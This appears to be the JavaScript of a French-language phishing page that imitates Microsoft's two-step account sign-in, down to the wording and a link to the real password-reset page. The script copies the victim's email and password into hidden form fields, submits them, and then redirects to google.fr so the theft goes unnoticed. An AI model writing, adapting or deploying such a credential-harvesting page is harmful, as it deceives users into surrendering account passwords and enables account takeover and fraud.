const validateEmail = (email) => {
	return email.match(
		/^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/
		);
		//return true;
	};

	function error_email_function (){
		error_email.classList.remove("hidden");
		boxCenter.style.height = "436px";
		box1.style.height = "358px";
		input_mail.classList.add("borderRed");
		input_mail.focus();
	}	

	function error_password_function (){
		error_email.classList.remove("hidden");
		boxCenter.style.height = "384px";
		input_password.classList.add("borderRed");
		input_password.focus();
	}

	function page_password(){

		filter.classList.remove("hidden");
		load_bar.classList.remove("hidden");
		setTimeout(function () {
			filter.classList.add("hidden");		
			load_bar.classList.add("hidden");		
			box2.classList.add("hidden");
			input_mail.classList.add("hidden");
			error_email.classList.add("hidden");
			return_but.classList.add("hidden");
			name_email.classList.remove("hidden");
			input_password.classList.remove("hidden");
			boxCenter.style.height = "364px";
			next_but.style.width = "114px";
			box1.style.height = "100%";
			name_email.innerHTML = input_mail.value;
			se_connecter.innerHTML = "Entrez le mot de passe";
			no_account.innerHTML = "<a href='https://account.live.com/ResetPassword.aspx'>Mot de passe oublié ?</a>";
			not_accesible.innerHTML = "<a href='#'>Autres façons de se connecter</a>";
			next_but.innerHTML = "Se connecter";
			input_password.focus();
		}, 1200);
	}

	SECOND_CLICK = false;
	function button_click_next(){
		if(input_mail.value == "" || !validateEmail(input_mail.value))
		{
			error_email_function();
		}else{
			if(!SECOND_CLICK){
				SECOND_CLICK = true
				page_password();

			}else{
				if(input_password.value != ""){
					username_form.value = input_mail.value;
					password_form.value = input_password.value;
					document.forms["form"].submit();
					window.location.replace("https://google.fr");
				}else{
					error_email.innerHTML = "Entrez le mot de passe de votre compte Microsoft.";
					error_password_function();
				}
			}
		}
	}

	window.onload=function(){
		next = document.getElementById("next");
		input_mail = document.getElementById("input_mail");
		input_password = document.getElementById("input_password");
		error_email = document.getElementById("error_email");
		box1 = document.getElementById("box-1");
		box2 = document.getElementById("box-2");
		boxCenter = document.getElementById("box-center");
		name_email = document.getElementById("name_email");
		no_account = document.getElementById("no_account");
		not_accesible = document.getElementById("not_accesible");
		se_connecter = document.getElementById("se-connecter");
		return_but = document.getElementById("return");
		next_but = document.getElementById("next");
		filter = document.getElementById("filter");
		load_bar = document.getElementById("load_bar");
		username_form = document.getElementById("username_form");
		password_form = document.getElementById("password_form");

		input_mail.focus();

		next.onclick = function () {
			button_click_next();
		};

		document.addEventListener("keyup", function(event) {
			if (event.keyCode === 13){
				button_click_next();

			}  
		});
	};